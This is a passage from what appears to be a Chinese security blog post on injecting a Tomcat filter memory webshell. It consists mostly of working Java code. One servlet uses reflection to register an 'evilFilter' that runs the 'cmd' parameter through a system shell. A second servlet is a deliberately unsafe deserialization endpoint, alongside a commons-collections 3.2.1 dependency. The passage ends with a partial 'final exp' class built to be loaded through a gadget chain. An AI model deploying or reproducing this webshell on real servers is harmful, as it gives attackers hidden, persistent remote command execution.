class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilFilter</span>();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterDef  </span></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">            filterDef.setFilter(filter);  </span><br><span class="line">            filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">            stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterMap  </span></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">            filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">            filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">            stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">            filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">                response.getWriter().println(output);  </span><br><span class="line">                System.out.println(output);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line"><span class="comment">//            chain.doFilter(request, response);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">            Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功打入内存马<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729212118.png" alt="image.png"></p><p>这里是直接写了个Servlet来写入内存马的, 我们也可以结合反序列化<br>先写一个反序列化入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/unser&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserialServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span>  IOException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">paylod</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;payload&quot;</span>);  </span><br><span class="line">        System.out.println(paylod);  </span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(paylod);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            obj = ois.readObject();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">        ois.close();  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(obj.toString());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>最终内存马, 配合cc链加载两次此类即可写入内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 获取standardContext  </span></span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">            <span class="keyword">if</span> (requestFacade != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">                <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化evilFilter  </span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">filterShell</span>();  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterDef  </span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line">                filterDef.setFilter(filter);  </span><br><span class="line">                filterDef.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());  </span><br><span class="line">                stdctx.addFilterDef(filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterMap  </span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();  </span><br><span class="line">                filterMap.setFilterName(filter.getClass().getName());  </span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/evil&quot;</span>);  </span><br><span class="line">                filterMap.addServletName(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">                stdctx.addFilterMap(filterMap);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 实例化ApplicationFilterConfig  </span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">filterConfigClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);  </span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> filterConfigClass.getDeclaredConstructor(Context.class, FilterDef.class);  </span><br><span class="line">                constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(stdctx, filterDef);  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">// 添加FilterConfig  </span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> stdctx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);  </span><br><span class="line">                filterConfigsField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                Map&lt;String,ApplicationFilterConfig&gt; filterConfigs = (HashMap) filterConfigsField.get(stdctx);  </span><br><span class="line">                filterConfigs.put(filter.getClass().getName(), filterConfig);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;Error: &quot;</span> + e.getMessage());  </span><br><span class="line">            e.printStackTrace();  